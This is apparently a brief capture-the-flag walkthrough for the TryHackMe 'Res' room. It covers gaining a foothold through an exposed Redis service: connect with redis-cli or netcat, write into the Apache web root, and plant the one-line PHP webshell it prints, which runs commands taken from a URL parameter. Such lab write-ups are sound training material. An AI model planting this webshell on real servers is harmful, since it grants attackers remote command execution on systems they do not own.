# [Res](https://tryhackme.com/room/res)


### Task 5 Compromise the machine and locate user.txt
0. [HackTricks Webshell](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#webshell)
1. Apache writeable path `/var/www/html`
2. Connecting via `redis-cli` or `netcat`
```
redis-cli -h $ip
nc -vn $ip $port
```
3. Then one line php webshell `"<?php system($_GET['cmd']); ?>"`

### Task 6
